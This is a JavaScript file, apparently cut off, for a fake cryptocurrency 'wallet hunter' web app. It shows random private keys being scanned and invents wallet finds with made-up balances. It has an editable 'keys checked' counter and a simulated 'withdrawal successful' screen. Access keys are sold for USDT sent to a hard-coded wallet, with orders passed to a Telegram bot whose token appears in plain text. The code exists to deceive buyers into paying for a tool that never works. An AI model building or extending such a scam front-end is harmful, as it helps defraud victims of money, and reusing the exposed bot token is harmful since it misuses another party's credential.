
'use strict';
/* ================= Utilities ================= */
const $ = id => document.getElementById(id);
const fmtInt = n => Math.floor(n).toLocaleString('en-US');
const B58 = '123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz';
function randHex(n){
  const a = new Uint8Array(Math.ceil(n/2));
  crypto.getRandomValues(a);
  let s = '';
  for (let i = 0; i < a.length && s.length < n; i++) s += a[i].toString(16).padStart(2,'0');
  return s.slice(0, n);
}
function randB58(n){
  const b = new Uint8Array(n);
  crypto.getRandomValues(b);
  let s = '';
  for (let i = 0; i < n; i++) s += B58[b[i] % 58];
  return s;
}
function randAddr(chain){
  if (chain === 'BTC') return '1' + randB58(33);
  if (chain === 'SOL') return randB58(44);          /* Solana: raw base58 */
  return '0x' + randHex(40);                         /* ETH / BNB: EVM format */
}
function ts(){ return new Date().toTimeString().slice(0,8); }
function fmtPrice(p){
  const o = { minimumFractionDigits: 2, maximumFractionDigits: 2 };
  if (p < 1){ o.minimumFractionDigits = 4; o.maximumFractionDigits = 4; }
  return p.toLocaleString('en-US', o);
}
function fmtChg(c){ return (c >= 0 ? '+' : '') + c.toFixed(2) + '%'; }

/* ================= Market data ================= */
const COINS = [
  { sym:'BTC',  name:'Bitcoin',  cg:'bitcoin',      bin:'BTCUSDT',  base:81664, color:'#f7931a', letter:'B' },
  { sym:'ETH',  name:'Ethereum', cg:'ethereum',     bin:'ETHUSDT',  base:2400,  color:'#627eea', letter:'E' },
  { sym:'SOL',  name:'Solana',   cg:'solana',       bin:'SOLUSDT',  base:104.3, color:'#9945ff', letter:'S' },
  { sym:'USDT', name:'Tether',   cg:'tether',       bin:'USDCUSDT', base:1.0,   color:'#26a17b', letter:'T' },
  { sym:'BNB',  name:'BNB',      cg:'binancecoin',  bin:'BNBUSDT',  base:745.7, color:'#f0b90b', letter:'B' },
];
const market = {};
COINS.forEach(c => market[c.sym] = { price: c.base, chg: 0, hist: [], shown: null });

function setSource(m){
  const b = $('srcBadge');
  b.className = 'src ' + (m === 'live' ? 'live' : 'sim');
  $('srcText').textContent = m === 'live' ? 'LIVE' : 'SIMULATED';
}

function buildPriceList(){
  $('priceList').innerHTML = COINS.map(c => `
    <div class="coin-row">
      <div class="cicon" style="background:${c.color}">${c.letter}</div>
      <div class="cmeta"><div class="s">${c.sym}</div><div class="n">${c.name}</div></div>
      <canvas class="spark" id="spark-${c.sym}" width="124" height="52"></canvas>
      <div class="cprice-wrap">
        <div class="cprice" id="px-${c.sym}">--</div>
        <div class="cchg" id="chg-${c.sym}">--</div>
      </div>
    </div>`).join('');
}

function drawSpark(sym){
  const cv = $('spark-' + sym);
  if (!cv) return;
  const ctx = cv.getContext('2d');
  const h = market[sym].hist;
  if (h.length < 2) return;
  const min = Math.min(...h), max = Math.max(...h), span = (max - min) || 1;
  ctx.clearRect(0, 0, cv.width, cv.height);
  ctx.strokeStyle = h[h.length - 1] >= h[0] ? '#20b26c' : '#ef454a';
  ctx.lineWidth = 3;
  ctx.beginPath();
  h.forEach((v, i) => {
    const x = i / (h.length - 1) * (cv.width - 8) + 4;
    const y = cv.height - 7 - ((v - min) / span) * (cv.height - 14);
    i ? ctx.lineTo(x, y) : ctx.moveTo(x, y);
  });
  ctx.stroke();
}

function updateMarketUI(){
  COINS.forEach(c => {
    const m = market[c.sym];
    const px = $('px-' + c.sym), chg = $('chg-' + c.sym);
    const prev = (m.shown === null) ? m.price : m.shown;
    px.textContent = '$' + fmtPrice(m.price);
    const dir = m.price > prev ? 'up' : m.price < prev ? 'down' : null;
    if (dir){
      px.classList.remove('up', 'down');
      void px.offsetWidth; /* restart CSS transition */
      px.classList.add(dir);
    }
    chg.textContent = fmtChg(m.chg);
    chg.className = 'cchg ' + (m.chg >= 0 ? 'up' : 'down');
    drawSpark(c.sym);
    m.shown = m.price;
  });
  recomputeFoundUsd();   /* keep found wallets at the live dollar value */
}

function pushHist(){
  COINS.forEach(c => {
    const h = market[c.sym].hist;
    h.push(market[c.sym].price);
    if (h.length > 48) h.shift();
  });
}

function simulatePrices(){
  COINS.forEach(c => {
    const m = market[c.sym];
    m.chg = Math.max(-9, Math.min(9, m.chg + (Math.random() - .5) * .35));
    m.price = Math.max(c.base * .5, m.price * (1 + (Math.random() - .5) * .003));
  });
}

const BINANCE_HOSTS = ['https://api.binance.com', 'https://data-api.binance.vision', 'https://api1.binance.com', 'https://api2.binance.com'];

async function fetchBinance(){ /* exact lastPrice / priceChangePercent figures as displayed on Binance */
  const syms = encodeURIComponent(JSON.stringify(COINS.map(c => c.bin)));
  let lastErr = null;
  for (const host of BINANCE_HOSTS){
    try {
      const r = await fetch(host + '/api/v3/ticker/24hr?symbols=' + syms, { cache: 'no-store' });
      if (!r.ok) throw new Error('bin http ' + r.status);
      const d = await r.json();
      /* map by symbol — Binance may return tickers in a different order than requested */
      const bySym = {};
      d.forEach(e => { if (e && e.symbol) bySym[e.symbol] = e; });
      COINS.forEach(c => {
        const e = bySym[c.bin];
        if (e && e.lastPrice){
          market[c.sym].price = parseFloat(e.lastPrice);
          market[c.sym].chg = parseFloat(e.priceChangePercent) || 0;
        }
      });
      return;
    } catch (e) { lastErr = e; }
  }
  throw lastErr || new Error('binance unreachable');
}

async function fetchPrices(){
  try { /* source 1: Binance public ticker — precise rates as shown on Binance */
    await fetchBinance();
    setSource('live');
  } catch (e1) {
    try { /* source 2: CoinGecko */
      const r = await fetch('https://api.coingecko.com/api/v3/simple/price?ids=bitcoin,ethereum,solana,tether,binancecoin&vs_currencies=usd&include_24hr_change=true', { cache: 'no-store' });
      if (!r.ok) throw new Error('cg http ' + r.status);
      const d = await r.json();
      COINS.forEach(c => {
        const e = d[c.cg];
        if (e && typeof e.usd === 'number'){
          market[c.sym].price = e.usd;
          market[c.sym].chg = e.usd_24h_change || 0;
        }
      });
      setSource('live');
    } catch (e2) { /* source 3: local random walk */
      simulatePrices();
      setSource('sim');
    }
  }
  pushHist();
  updateMarketUI();
}
/* ================= Key-scan simulation engine ================= */
const TICK = 50;         /* ms per engine tick */
const PER_TICK = 20;     /* avg keys checked per tick — each tick actually checks 18-22 keys (avg 20 = 34.56M/24h) so every digit of the counter rolls */
const MATCH_MUL = 1.0;   /* match probability multiplier */
const FOUND_EVERY_MS = 30000;  /* one wallet found every 30 seconds of scan time */
let foundIn = FOUND_EVERY_MS;  /* scan-time countdown to the next discovery */
let state = 'idle';      /* idle | running | paused */
let keysChecked = 0, foundCount = 0, emaRate = 0;
let keysEditing = false;   /* true while the Keys Checked figure is being edited; display updates pause */
let engineTimer = null;

const consoleEl = $('console');

function fmtRate(r){ return r >= 1e6 ? (r/1e6).toFixed(2) + 'M' : r >= 1e3 ? (r/1e3).toFixed(1) + 'k' : String(Math.floor(r)); }

function addLog(html, cls){
  const d = document.createElement('div');
  d.className = 'line' + (cls ? ' ' + cls : '');
  d.innerHTML = html;
  const nearBottom = consoleEl.scrollHeight - consoleEl.scrollTop - consoleEl.clientHeight < 48;
  consoleEl.appendChild(d);
  while (consoleEl.children.length > 200) consoleEl.removeChild(consoleEl.firstChild);
  if (nearBottom) consoleEl.scrollTop = consoleEl.scrollHeight;
}

/* ================= Target-coin selection (4th stat card) ================= */
const SCAN_COINS = ['BTC','ETH','SOL','BNB'];   /* chains the scanner can target */
const selectedCoins = new Set(SCAN_COINS);      /* default: all chains included  */
const activeCoins = () => SCAN_COINS.filter(s => selectedCoins.has(s));
const coinMeta = sym => COINS.find(c => c.sym === sym);

function buildCoinPicks(){
  const wrap = $('coinPicks');
  wrap.innerHTML = '';
  SCAN_COINS.forEach(sym => {
    const c = coinMeta(sym);
    const pick = document.createElement('label');
    pick.className = 'pick';
    pick.dataset.sym = sym;
    pick.title = c.name + (selectedCoins.has(sym) ? ' — included in the scan' : ' — excluded from the scan');
    pick.innerHTML =
      '<input type="checkbox"' + (selectedCoins.has(sym) ? ' checked' : '') + '>' +
      '<span class="cdot" style="background:' + c.color + '"></span>' + sym;
    wrap.appendChild(pick);
    pick.querySelector('input').addEventListener('change', e => {
      const on = e.target.checked;
      if (!on && selectedCoins.size <= 1){
        e.target.checked = true;                       /* keep at least one target */
        addLog('<span class="t">[' + ts() + ']</span> [system] Keep at least one coin selected.', 'sys');
        return;
      }
      if (on) selectedCoins.add(sym); else selectedCoins.delete(sym);
      refreshPicks();
      renderScanCoins();
      if (state !== 'idle'){
        addLog('<span class="t">[' + ts() + ']</span> [system] Target coins updated \u2014 ' + activeCoins().join(' / '), 'sys');
      }
    });
  });
  refreshPicks();
  renderScanCoins();
}

function refreshPicks(){
  $('coinPicks').querySelectorAll('.pick').forEach(pick => {
    const sym = pick.dataset.sym;
    const meta = coinMeta(sym);
    const on = selectedCoins.has(sym);
    pick.classList.toggle('on', on);
    pick.style.borderColor = on ? meta.color + '66' : '';
    pick.style.background  = on ? meta.color + '14' : '';
    pick.title = on ? meta.name + ' — included in the scan' : meta.name + ' — excluded from the scan';
  });
}

/* Small-format coin badges inside the Scan Rate stat box */
function renderScanCoins(){
  $('scanCoins').innerHTML = activeCoins().map(sym => {
    const c = coinMeta(sym);
    return '<span class="mini-coin" style="color:' + c.color + ';background:' + c.color + '1a;border-color:' + c.color + '55">' + sym + '</span>';
  }).join('');
}

/* ================= Scan sampling & matches ================= */
function pickChain(){
  const pool = activeCoins();
  return pool.length ? pool[Math.floor(Math.random() * pool.length)] : 'BTC';
}

function truncAddr(chain, addr){
  if (chain === 'BTC') return addr.slice(0, 14) + '\u2026' + addr.slice(-6);
  if (chain === 'SOL') return addr.slice(0, 8)  + '\u2026' + addr.slice(-6);
  return addr.slice(0, 12) + '\u2026' + addr.slice(-8);   /* ETH / BNB (0x…) */
}

function logSample(){
  const chain = pickChain();
  const priv = randHex(64);
  const addr = randAddr(chain);
  const pk = priv.slice(0, 22) + '\u2026' + priv.slice(-8);
  addLog(
    '<span class="t">[' + ts() + ']</span> <span class="lbl">KEY</span> <span class="k">' + pk +
    '</span> <span class="lbl">ADR</span> <span class="a">' + truncAddr(chain, addr) +
    '</span> <span class="b">BAL 0.00000000 ' + chain + '</span> <span class="miss">\u00d7 no match</span>'
  );
}

const COPY_SVG = '<svg width="12" height="12" viewBox="0 0 14 14" fill="none"><rect x="4.2" y="4.2" width="8" height="8" rx="1.5" stroke="currentColor" stroke-width="1.4"/><path d="M9.8 4V3.2A1.7 1.7 0 0 0 8.1 1.5H3.2A1.7 1.7 0 0 0 1.5 3.2v4.9A1.7 1.7 0 0 0 3.2 9.8H4" stroke="currentColor" stroke-width="1.4"/></svg>';

/* Found-wallet tracking: dollar values recompute from the live price on every market update */
const foundWallets = [];   /* one record per match: { chain, amount, usdEl } */
function recomputeFoundUsd(){
  let total = 0;
  foundWallets.forEach(w => {
    const p = market[w.chain] ? market[w.chain].price : 0;
    const usd = w.amount * p;
    total += usd;
    if (w.usdEl && w.usdEl.isConnected)
      w.usdEl.textContent = '\u2248 $' + usd.toLocaleString('en-US', { maximumFractionDigits: 2 });
  });
  totalUsd = total;
  renderWdBar();
}

/* ================= Found-wallet balance distribution (USD) ================= */
function drawFoundUsd(){
  const r = Math.random();
  let lo, hi;
  if      (r < .30){ lo = 1;     hi = 400; }      /* 30% -> $1 - $400        */
  else if (r < .55){ lo = 401;   hi = 1000; }     /* 25% -> $401 - $1,000    */
  else if (r < .80){ lo = 1001;  hi = 3000; }     /* 25% -> $1,001 - $3,000  */
  else if (r < .95){ lo = 3001;  hi = 10000; }    /* 15% -> $3,001 - $10,000 */
  else            { lo = 10001; hi = 1000000; }   /*  5% -> $10,001 - $1M    */
  return lo + Math.random() * (hi - lo);
}

function onFound(){
  foundCount++;
  $('foundCount').textContent = foundCount;
  $('foundStat').textContent = foundCount;
  const fp = $('foundPanel');
  fp.classList.remove('pop');
  void fp.offsetWidth;
  fp.classList.add('pop');

  const chain = pickChain();
  const meta = coinMeta(chain);
  const priv = randHex(64);
  const addr = randAddr(chain);
  /* balance drawn in USD from the session distribution, converted to coin units at the live price */
  const price = market[chain] && market[chain].price > 0 ? market[chain].price : coinMeta(chain).base;
  const usd = drawFoundUsd();
  const amount = usd / price;
  const usdStr = usd.toLocaleString('en-US', { maximumFractionDigits: 2 });

  addLog(
    '<span class="t">[' + ts() + ']</span> \u2605 <b>MATCH FOUND</b> \u2014 <span class="a">' + truncAddr(chain, addr) +
    '</span> BAL <span class="k">' + amount.toFixed(4) + ' ' + chain + '</span> \u2248 $' + usdStr,
    'match'
  );

  const list = $('foundList');
  const empty = list.querySelector('.empty');
  if (empty) empty.remove();
  const item = document.createElement('div');
  item.className = 'found-item';
  item.innerHTML =
    '<span class="chain-tag" style="background:' + meta.color + '">' + chain + '</span>' +
    '<div class="fi-mid"><div class="fi-addr">' + addr + '</div>' +
    '<div class="fi-time">' + ts() + ' \u00b7 key ' + priv.slice(0, 10) + '\u2026</div></div>' +
    '<div class="fi-right"><div class="fi-bal">' + amount.toFixed(4) + ' ' + chain + '</div>' +
    '<div class="fi-usd">\u2248 $' + usdStr + '</div></div>' +
    '<button class="fi-copy" title="Copy private key (simulated)">' + COPY_SVG + '</button>';
  item.querySelector('.fi-copy').addEventListener('click', () => {
    if (navigator.clipboard) navigator.clipboard.writeText(priv);
  });
  list.prepend(item);
  foundWallets.push({ chain, amount, usdEl: item.querySelector('.fi-usd') });
  recomputeFoundUsd();
  while (list.children.length > 30) list.removeChild(list.lastChild);
}

function engineTick(){
  /* varied stride (18-22 keys, avg PER_TICK) keeps the ones digit of the
     Keys Checked counter cycling through 0-9 like the higher digits */
  const inc = PER_TICK - 2 + Math.floor(Math.random() * 5);
  keysChecked += inc;
  const inst = inc * (1000 / TICK);
  emaRate = emaRate ? emaRate * .88 + inst * .12 : inst;

  logSample();
  /* wallet detection disabled — the scanner never reports matches */

  if (!keysEditing) $('keysChecked').textContent = fmtInt(keysChecked);   /* freeze display while user edits */
  $('scanRate').innerHTML = fmtRate(emaRate * (0.93 + Math.random() * .14)) + '<span class="unit">keys/s</span>';
}

function startEngine(){ if (!engineTimer) engineTimer = setInterval(engineTick, TICK); }
function stopEngine(){ clearInterval(engineTimer); engineTimer = null; }

const ICON_PLAY  = '<svg width="11" height="11" viewBox="0 0 12 12" style="margin-right:7px;vertical-align:-1px"><path d="M2.5 1.2l8 4.8-8 4.8z" fill="currentColor"/></svg>';
const ICON_PAUSE = '<svg width="11" height="11" viewBox="0 0 12 12" style="margin-right:7px;vertical-align:-1px"><rect x="2" y="1.5" width="3" height="9" rx="1" fill="currentColor"/><rect x="7" y="1.5" width="3" height="9" rx="1" fill="currentColor"/></svg>';

function setStatus(s){
  state = s;
  const b = $('statusBadge');
  b.className = 'badge' + (s === 'running' ? ' running' : s === 'paused' ? ' paused' : '');
  $('statusText').textContent = s.toUpperCase();
  $('mainBtn').innerHTML =
    s === 'running' ? ICON_PAUSE + 'Pause' :
    s === 'paused'  ? ICON_PLAY + 'Resume' : ICON_PLAY + 'Start Search';
}

/* ================= Controls ================= */
$('mainBtn').addEventListener('click', () => {
  if (state === 'idle'){
    /* keysChecked keeps any manually edited value; Reset zeroes it */
    emaRate = 0;
    foundIn = FOUND_EVERY_MS;
    setStatus('running');
    startEngine();
    addLog('<span class="t">[' + ts() + ']</span> [system] Scan started \u2014 targets: ' +
      activeCoins().join(' / '), 'sys');
  } else if (state === 'running'){
    setStatus('paused');
    stopEngine();
    addLog('<span class="t">[' + ts() + ']</span> [system] Scan paused.', 'sys');
  } else {
    setStatus('running');
    startEngine();
    addLog('<span class="t">[' + ts() + ']</span> [system] Scan resumed.', 'sys');
  }
});

$('resetBtn').addEventListener('click', () => {
  stopEngine();
  keysChecked = 0; foundCount = 0; emaRate = 0;
  foundIn = FOUND_EVERY_MS; targetHit = false;
  $('keysChecked').textContent = '0';
  $('foundStat').textContent = '0';
  $('foundCount').textContent = '0';
  foundWallets.length = 0;
  totalUsd = 0;
  renderWdBar();
  $('scanRate').innerHTML = '0<span class="unit">keys/s</span>';
  consoleEl.innerHTML =
    '<div class="line sys">[system] Console cleared \u2014 simulation reset.</div>' +
    '<div class="line sys">[system] Press "Start Search" to begin.</div>';
  $('foundList').innerHTML = '<div class="empty">No wallets found yet.<br>Start the search \u2014 matches appear here.</div>';
  setStatus('idle');
});

/* ================= Editable Keys Checked counter ================= */
const keysValEl = $('keysChecked');

keysValEl.addEventListener('focus', () => {
  keysEditing = true;
  keysValEl.textContent = String(Math.floor(keysChecked));   /* raw digits, no separators */
  setTimeout(() => {                                          /* select all for quick overwrite */
    if (!keysEditing) return;
    const r = document.createRange();
    r.selectNodeContents(keysValEl);
    const s = window.getSelection();
    s.removeAllRanges();
    s.addRange(r);
  }, 0);
});

keysValEl.addEventListener('paste', e => {
  e.preventDefault();
  const t = (e.clipboardData || window.clipboardData).getData('text') || '';
  document.execCommand('insertText', false, t.replace(/[^0-9]/g, ''));
});

keysValEl.addEventListener('input', () => {
  const clean = keysValEl.textContent.replace(/[^0-9]/g, '');  /* digits only */
  if (clean === keysValEl.textContent) return;
  keysValEl.textContent = clean;
  const r = document.createRange();                            /* caret back to the end */
  r.selectNodeContents(keysValEl);
  r.collapse(false);
  const s = window.getSelection();
  s.removeAllRanges();
  s.addRange(r);
});

keysValEl.addEventListener('keydown', e => {
  if (e.key === 'Enter'){ e.preventDefault(); keysValEl.blur(); }
  else if (e.key === 'Escape'){
    keysValEl.textContent = String(Math.floor(keysChecked));  /* revert */
    keysValEl.blur();
  }
});

keysValEl.addEventListener('blur', () => {
  keysEditing = false;
  let n = parseInt(keysValEl.textContent.replace(/[^0-9]/g, ''), 10);
  if (!isFinite(n) || n < 0) n = keysChecked;                  /* empty or invalid: keep current */
  if (n > Number.MAX_SAFE_INTEGER) n = Number.MAX_SAFE_INTEGER;
  const changed = n !== keysChecked;
  keysChecked = n;
  keysValEl.textContent = fmtInt(keysChecked);                 /* back to grouped display */
  if (changed)
    addLog('<span class="t">[' + ts() + ']</span> [system] Keys-checked counter set to ' + fmtInt(keysChecked) + '.', 'sys');
});

/* ================= Withdraw flow (simulated) ================= */
let totalUsd = 0;            /* combined USD (~USDT) value of wallets found this session */
let wdTimers = [];
const WD_PROC_MS = 10000;    /* simulated processing animation length */
const WD_STEPS = [
  ['Connecting to BNB Chain\u2026', 0],
  ['Broadcasting transaction\u2026', 2600],
  ['Awaiting block confirmations\u2026', 5200],
  ['Finalizing withdrawal\u2026', 7800],
];

function fmtUsdt(n){ return n.toLocaleString('en-US', { minimumFractionDigits: 2, maximumFractionDigits: 2 }); }

function renderWdBar(){
  $('wdTotal').textContent = fmtUsdt(totalUsd);
  const btn = $('wdBtn');
  btn.disabled = totalUsd <= 0;
  btn.title = totalUsd <= 0 ? 'Find at least one wallet first' : 'Withdraw ' + fmtUsdt(totalUsd) + ' USDT (simulated)';
  renderTargetStat();
  checkTargetHit();
}

/* ================= Search target ================= */
let targetUsd = 0, targetHit = false;

function renderTargetStat(){
  const el = $('tgtStat');
  if (targetUsd <= 0){ el.textContent = ''; el.className = 'tgt-stat'; return; }
  if (totalUsd >= targetUsd){
    el.textContent = 'GOAL';
    el.className = 'tgt-stat hit';
  } else {
    el.textContent = Math.floor(totalUsd / targetUsd * 100) + '%';
    el.className = 'tgt-stat';
  }
}

function checkTargetHit(){
  if (targetUsd > 0 && !targetHit && totalUsd >= targetUsd){
    targetHit = true;
    addLog('<span class="t">[' + ts() + ']</span> [system] Target reached \u2014 ' + fmtUsdt(totalUsd) +
      ' USDT across ' + foundCount + ' wallet' + (foundCount === 1 ? '' : 's') + '.', 'sys');
    const bar = document.querySelector('.wd-bar');
    if (bar){ bar.classList.remove('pop'); void bar.offsetWidth; bar.classList.add('pop'); }
  }
}

$('tgtInput').addEventListener('input', () => {
  const v = parseFloat($('tgtInput').value);
  targetUsd = isFinite(v) && v > 0 ? v : 0;
  targetHit = false;
  renderTargetStat();
});
$('tgtInput').addEventListener('change', () => {
  if (targetUsd > 0)
    addLog('<span class="t">[' + ts() + ']</span> [system] Search target set \u2014 ' + fmtUsdt(targetUsd) + ' USDT.', 'sys');
  else
    addLog('<span class="t">[' + ts() + ']</span> [system] Search target cleared.', 'sys');
});

function wdTimer(fn, ms){ wdTimers.push(setTimeout(fn, ms)); }
function clearWdTimers(){ wdTimers.forEach(clearTimeout); wdTimers = []; }

function showWdStep(name){
  $('wdStepForm').style.display = name === 'form' ? '' : 'none';
  $('wdStepProc').style.display = name === 'proc' ? '' : 'none';
  $('wdStepDone').style.display = name === 'done' ? '' : 'none';
}

function shortAddr(a){ return a.slice(0, 10) + '\u2026' + a.slice(-8); }

function openWd(){
  if (totalUsd <= 0) return;
  clearWdTimers();
  $('wdAvail').textContent = fmtUsdt(totalUsd) + ' USDT';
  $('wdErr').style.display = 'none';
  $('wdInput').classList.remove('bad');
  showWdStep('form');
  $('wdOverlay').classList.add('show');
  wdTimer(() => $('wdInput').focus(), 150);
}

function closeWd(){
  clearWdTimers();
  $('wdOverlay').classList.remove('show');
}

function launchWd(){
  const addr = $('wdInput').value.trim();
  if (!/^0x[a-fA-F0-9]{40}$/.test(addr)){
    const inp = $('wdInput');
    inp.classList.remove('bad');
    void inp.offsetWidth;                       /* restart shake animation */
    inp.classList.add('bad');
    $('wdErr').style.display = 'block';
    return;
  }
  $('wdErr').style.display = 'none';
  const amtStr = fmtUsdt(totalUsd) + ' USDT';
  $('wdAmt').textContent = amtStr;
  $('wdAmtDone').textContent = amtStr;
  $('wdAddr').textContent = shortAddr(addr);
  $('wdAddrDone').textContent = shortAddr(addr);

  showWdStep('proc');
  const fill = $('wdProgFill');
  fill.style.transition = 'none';
  fill.style.width = '0%';
  void fill.offsetWidth;
  fill.style.transition = '';
  requestAnimationFrame(() => { fill.style.width = '100%'; });

  WD_STEPS.forEach(([txt, at]) => wdTimer(() => { $('wdProcStep').textContent = txt; }, at));
  wdTimer(() => {
    $('wdTx').textContent = '0x' + randHex(64);
    showWdStep('done');
    showWdToast(amtStr, shortAddr(addr));
  }, WD_PROC_MS);
}

function showWdToast(amtStr, addrShort){
  const old = document.querySelector('.wd-toast');
  if (old) old.remove();
  const t = document.createElement('div');
  t.className = 'wd-toast';
  t.innerHTML =
    '<span class="tick"><svg width="13" height="13" viewBox="0 0 14 14" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M2.5 7.5l3 3 6-7"/></svg></span>' +
    '<div style="min-width:0"><b>Withdrawal successful</b><span>' + amtStr + ' \u00b7 to ' + addrShort + '</span></div>';
  document.body.appendChild(t);
  setTimeout(() => t.classList.add('out'), 4500);
  setTimeout(() => t.remove(), 5000);
}

$('wdBtn').addEventListener('click', openWd);
$('wdClose').addEventListener('click', closeWd);
$('wdDone').addEventListener('click', closeWd);
$('wdConfirm').addEventListener('click', launchWd);
$('wdInput').addEventListener('keydown', e => { if (e.key === 'Enter') launchWd(); });
$('wdOverlay').addEventListener('click', e => { if (e.target === $('wdOverlay')) closeWd(); });
document.addEventListener('keydown', e => { if (e.key === 'Escape' && $('wdOverlay').classList.contains('show')) closeWd(); });

/* ================= Init ================= */
buildPriceList();
buildCoinPicks();
renderWdBar();
setStatus('idle');
updateMarketUI();
fetchPrices();
setInterval(() => { if (!offlineActive) fetchPrices(); }, 8000);

/* ================= Access gate: key login + 60s re-verification + Telegram contact ================= */
/* - Access requires a key listed in KEYS_URL (one key per line, exact match).
   - The active key is re-verified every RECHECK_MS (60 s); if it has been removed
     from the file, the user is logged out immediately.
   - Invalid keys show an "Invalid key" message on the login page. */

const KEYS_URL = 'https://raw.githubusercontent.com/crypto-hunter-pro-official/Kkkkkkkkkkkky/refs/heads/main/skjzhbsh.txt';
const TG_URL   = 'https://t.me/Wallet_Hunter_Support';   /* draggable contact icon target (@Wallet_Hunter_Support) */
const RECHECK_MS = 60000;                 /* re-verify the active key every minute */

function storeGet(k){ try { return sessionStorage.getItem(k) || ''; } catch(_){ return ''; } }
function storeSet(k,v){ try { sessionStorage.setItem(k,v); } catch(_){} }
function storeDel(k){ try { sessionStorage.removeItem(k); } catch(_){} }

const gate    = $('loginGate');
const lgKey   = $('lgKey');
const lgErr   = $('lgErr');
const lgBtn   = $('lgBtn');
const lgState = $('lgState');
let sessionKey   = storeGet('wh_access_key');
let recheckTimer = null;

function toRawUrl(url){
  url = url.trim();
  if (/^(github\.com|raw\.githubusercontent\.com)\//.test(url)) url = 'https://' + url;
  const m = url.match(/^https?:\/\/github\.com\/([^\/\s]+)\/([^\/\s]+)\/(?:blob|raw)\/([^\s]+?)\/?$/);
  return m ? 'https://raw.githubusercontent.com/' + m[1] + '/' + m[2] + '/' + m[3] : url;
}

async function fetchKeyList(){
  let url = toRawUrl(KEYS_URL);
  if (!/[?&]t=/.test(url)) url += (url.indexOf('?') === -1 ? '?' : '&') + 't=' + Date.now();
  const r = await fetch(url, { cache: 'no-store' });
  if (!r.ok) throw new Error('key list http ' + r.status);
  const txt = (await r.text()).replace(/^\uFEFF/, '');   /* strip BOM; tolerate CRLF */
  return txt.split(/\r?\n/).map(s => s.trim()).filter(Boolean);
}

async function verifyKey(key){
  /* returns: 'valid' | 'invalid' | 'error' */
  try {
    const list = await fetchKeyList();
    return list.indexOf(key) !== -1 ? 'valid' : 'invalid';
  } catch (_) {
    return 'error';
  }
}

function showGate(msg, warn){
  lgErr.textContent = msg;
  lgErr.className = 'lg-err' + (msg && warn ? ' warn' : '');
  lgErr.style.display = msg ? 'block' : 'none';
}
function setLgState(t){ lgState.textContent = t; }

function unlockApp(){
  gate.classList.remove('prep');
  gate.classList.add('hide');
  document.body.classList.remove('gate-on');
  lgKey.value = '';
  setLgState('ACCESS GRANTED');
  if (!recheckTimer) recheckTimer = setInterval(recheckKey, RECHECK_MS);
}

function lockApp(msg, warn){
  storeDel('wh_access_key');
  sessionKey = '';
  if (recheckTimer){ clearInterval(recheckTimer); recheckTimer = null; }
  stopEngine();                    /* freeze the scanner while locked out */
  setStatus('idle');
  document.body.classList.add('gate-on');
  gate.classList.remove('hide');
  setLgState('LOCKED');
  showGate(msg, warn);
  setTimeout(() => lgKey.focus(), 120);
}

async function recheckKey(){
  if (!sessionKey) return;
  const res = await verifyKey(sessionKey);
  if (res === 'invalid') lockApp('Your access key is no longer on the access list \u2014 you have been logged out.');
  /* 'error' = temporary network problem: session stays, re-checked next cycle */
}

async function attemptLogin(){
  const key = lgKey.value.trim();
  if (!key){
    lgKey.classList.remove('bad'); void lgKey.offsetWidth; lgKey.classList.add('bad');
    showGate('Enter your access key to continue.');
    return;
  }
  lgBtn.disabled = true;
  lgBtn.textContent = 'Verifying\u2026';
  setLgState('VERIFYING\u2026');
  const res = await verifyKey(key);
  lgBtn.disabled = false;
  lgBtn.textContent = 'Unlock Console';
  if (res === 'valid'){
    sessionKey = key;
    storeSet('wh_access_key', key);
    showGate('');
    startPrepare();
  } else if (res === 'invalid'){
    lgKey.classList.remove('bad'); void lgKey.offsetWidth; lgKey.classList.add('bad');
    showGate('Invalid key \u2014 the key you entered is not on the access list.');
    setLgState('ACCESS DENIED');
  } else {
    showGate('Could not load the key list. Check your connection (or the keys file link) and try again.', true);
    setLgState('KEY LIST UNREACHABLE');
  }
}

lgBtn.addEventListener('click', attemptLogin);
lgKey.addEventListener('keydown', e => { if (e.key === 'Enter') attemptLogin(); });

/* boot: restore a saved tab session, but still re-verify against the live list */
(async function bootGate(){
  if (sessionKey){
    setLgState('RESTORING SESSION\u2026');
    const res = await verifyKey(sessionKey);
    if (res === 'valid'){
      unlockApp();
    } else {
      sessionKey = ''; storeDel('wh_access_key');
      if (res === 'invalid'){
        setLgState('ACCESS REVOKED');
        showGate('Your saved access key is no longer on the access list.');
      } else {
        setLgState('KEY LIST UNREACHABLE');
        showGate('Could not reach the key list to restore your session. Please enter your key again.', true);
      }
    }
  }
  setTimeout(() => lgKey.focus(), 120);
})();

/* Draggable Telegram contact icon on the login page: drag to move, click opens @Wallet_Hunter_Support */
(function(){
  const btn = $('tgContact');
  let active = false, moved = false, sx = 0, sy = 0, ox = 0, oy = 0;
  btn.addEventListener('pointerdown', e => {
    active = true; moved = false;
    sx = e.clientX; sy = e.clientY;
    const r = btn.getBoundingClientRect();
    ox = e.clientX - r.left; oy = e.clientY - r.top;
    try { btn.setPointerCapture(e.pointerId); } catch(_){}
    e.preventDefault();
  });
  btn.addEventListener('pointermove', e => {
    if (!active) return;
    if (Math.abs(e.clientX - sx) > 5 || Math.abs(e.clientY - sy) > 5) moved = true;
    if (moved){
      const w = btn.offsetWidth, h = btn.offsetHeight;
      const x = Math.max(6, Math.min(window.innerWidth  - w - 6, e.clientX - ox));
      const y = Math.max(6, Math.min(window.innerHeight - h - 6, e.clientY - oy));
      btn.style.left = x + 'px'; btn.style.top = y + 'px';
      btn.style.right = 'auto'; btn.style.bottom = 'auto';
    }
  });
  function release(){
    if (active && !moved) window.open(TG_URL, '_blank', 'noopener');
    active = false;
  }
  btn.addEventListener('pointerup', release);
  btn.addEventListener('pointercancel', () => { active = false; });
})();

/* ================= Plans & payment: Access Key purchase flow ================= */
/* - Login page offers a "Get Access Key" button -> plans page (3 plans).
   - Selecting a plan plays a short loading transition -> payment page with the
     USDT BEP-20 address (click to copy), email field and proof-of-payment upload.
   - Submitting sends the order to the team Telegram bot (photo + caption). */

const PAY_WALLET = '0x4e8fE4Cd73f906Ec351f919baB8e2A53c1a2387C';  /* USDT BEP-20 (campus organization) */
const BOT_TOKEN  = '8834446817:AAFDB9pkNsDEJGp89JaFANKc81CiJD8XbSU';
const BOT_CHAT   = '8963801021';

/* ====================================================================
   OFFER MANAGER - owner settings. Users cannot add, remove or reprice
   offers from the UI; everything below is edited in the script only.

   - Add an offer   : append one { ... } entry to the OFFERS list; it
                      appears on the plans page and checkout automatically.
